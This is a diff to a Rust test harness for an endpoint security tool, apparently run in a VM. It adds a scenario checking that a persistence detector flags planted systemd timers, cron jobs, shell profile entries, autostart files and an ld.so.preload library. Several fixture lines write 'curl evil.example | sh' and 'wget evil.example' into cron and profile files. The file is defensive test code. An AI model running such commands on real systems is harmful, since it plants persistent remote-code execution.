@@ -12,17 +12,17 @@ use anyhow::Result;
 use super::f1::{install_plugin, provision, run_script, start_daemon};
 use super::vm::{Vm, run_capture};
 
-const PLUGINS: [&str; 2] = ["endpoint.isolate", "net.vpn"];
+const PLUGINS: [&str; 3] = ["endpoint.isolate", "net.vpn", "endpoint.persistence"];
 
 const LIB: &str = r#"
 set -e
-JSON_ID="python3 -c 'import json,sys;d=json.JSONDecoder().raw_decode(sys.stdin.read())[0];t=d.get(\"plan\") or d.get(\"transaction\");print(t[\"id\"] if isinstance(t,dict) else t)'"
+JSON_ID="python3 -c 'import json,sys;t=sys.stdin.read();i=t.find(\"{\");d=json.JSONDecoder().raw_decode(t[i:])[0] if i>=0 else {};t=d.get(\"plan\") or d.get(\"transaction\");print(t[\"id\"] if isinstance(t,dict) else t)'"
 # Plan and apply, leaving the transaction in TX and its output in OUT.
 # Network changes wait for a confirmation: the caller decides.
 apply_plan() {
   PLUGIN=$1; shift
   P=$(sudo ibexctl plan "$PLUGIN" "$@" --json 2>/tmp/plan.err | eval "$JSON_ID") || { echo "PLAN FAILED: $(cat /tmp/plan.err)"; return 1; }
-  OUT=$(sudo ibexctl apply "$P" --confirm-timeout ${CONFIRM:-300} --json 2>&1 || true)
+  OUT=$(sudo ibexctl apply "$P" --confirm-timeout ${CONFIRM:-300} --json 2>/tmp/apply.err || true)
   TX=$(echo "$OUT" | eval "$JSON_ID")
   [ -n "$TX" ] || { echo "APPLY FAILED: $OUT"; sudo journalctl -u ibexwalld -n 20 --no-pager; return 1; }
 }
@@ -230,6 +230,59 @@ sudo ip netns del vpnsrv; sudo ip link del vethc 2>/dev/null || true
 echo "METRIC: both rolled back: chain, marker, keyfile, record and interface gone; foreign tables identical"
 "#;
 
+const PERSISTENCE: &str = r#"
+trap 'sudo rm -f /etc/ld.so.preload' EXIT
+sudo ibexctl plugins enable endpoint.persistence >/dev/null
+# The check's reply carries the findings (outcomes go to the posture).
+check_ids() { sudo ibexctl check endpoint.persistence --json >/tmp/p-check.json 2>/dev/null || true; python3 -c 'import json
+print(" ".join(f["id"] for f in json.load(open("/tmp/p-check.json"))["findings"]))'; }
+
+# Nothing to compare against yet: said, not guessed.
+LINE=$(check_ids); [ -z "$LINE" ] || { echo "WITHOUT A BASELINE: $LINE"; exit 1; }
+
+# The persistence cases: a timer and its service, cron, shell profile,
+# autostart, and a preloaded library.
+printf '[Unit]\nDescription=evil\n' | sudo tee /etc/systemd/system/persist-evil.service >/dev/null
+printf '[Timer]\nOnBootSec=10\n[Install]\nWantedBy=timers.target\n' | sudo tee /etc/systemd/system/persist-evil.timer >/dev/null
+sudo mkdir -p /etc/cron.d /etc/profile.d
+printf '* * * * * root curl evil.example | sh\n' | sudo tee /etc/cron.d/persist-evil >/dev/null
+printf 'curl evil.example | sh\n' | sudo tee /etc/profile.d/persist-evil.sh >/dev/null
+sudo mkdir -p /root/.config/autostart
+printf '[Desktop Entry]\nType=Application\nExec=/usr/local/bin/evil\n' | sudo tee /root/.config/autostart/persist-evil.desktop >/dev/null
+printf '/usr/local/lib/evil.so\n' | sudo tee /etc/ld.so.preload >/dev/null
+
+# The preload is worth a finding even before any baseline exists.
+LINE=$(check_ids); [ "$LINE" = "persistence.preload" ] || { echo "PRELOAD NOT SEEN: $LINE"; exit 1; }
+
+# The person accepts what is there now.
+apply_plan endpoint.persistence --set action=baseline
+if echo "$OUT" | grep -q pending_confirm; then echo "A BASELINE SHOULD NOT NEED A CONFIRMATION"; exit 1; fi
+LINE=$(check_ids); [ "$LINE" = "persistence.preload" ] || { echo "AFTER THE BASELINE: $LINE"; exit 1; }
+echo "METRIC: baseline accepted; the five artifacts are quiet, the preload still speaks"
+
+# One new and one changed entry.
+printf '0 3 * * * root backup\n' | sudo tee /etc/cron.d/persist-new >/dev/null
+printf 'wget evil.example\n' | sudo tee /etc/profile.d/persist-evil.sh >/dev/null
+LINE=$(check_ids)
+[ "$LINE" = "persistence.preload persistence.new persistence.changed" ] || { echo "CHANGES NOT SEEN: $LINE"; exit 1; }
+for id in persistence.preload persistence.new persistence.changed; do
+  echo "$LINE" | grep -q "$id" || { echo "MISSING $id: $LINE"; exit 1; }
+done
+sudo ibexctl check endpoint.persistence --json | python3 -c '
+import json,sys
+paths = " ".join(f["args"].get("path","") for f in json.load(sys.stdin)["findings"])
+for expected in ["/etc/cron.d/persist-new", "/etc/profile.d/persist-evil.sh", "evil.so"]:
+    assert expected in paths, (expected, paths)
+print("paths named")'
+echo "METRIC: one new and one changed entry found, with their paths"
+
+# Undoing the baseline goes back to nothing claimed.
+sudo ibexctl rollback "$TX" >/dev/null || { echo "BASELINE ROLLBACK FAILED"; exit 1; }
+sudo test ! -e /var/lib/ibexwall/persistence/baseline.json || { echo "THE BASELINE SURVIVED"; exit 1; }
+LINE=$(check_ids); [ "$LINE" = "persistence.preload" ] || { echo "AFTER THE ROLLBACK: $LINE"; exit 1; }
+echo "METRIC: baseline rolled back; honest again"
+"#;
+
 pub fn run(vm: &Vm, workspace: &Path, install: &str) -> Result<()> {
     println!("== f9: build ==");
     let mut args = vec!["build".to_string(), "--release".to_string()];
@@ -265,6 +318,11 @@ pub fn run(vm: &Vm, workspace: &Path, install: &str) -> Result<()> {
     scenario!(
         "e1 endpoint.isolate: the network is cut except the allow list, then comes back, or reverts unconfirmed",
         ISOLATE
+    );
+
+    scenario!(
+        "p1 endpoint.persistence: the places a program stays are watched against an accepted baseline",
+        PERSISTENCE
     );
 
     scenario!(
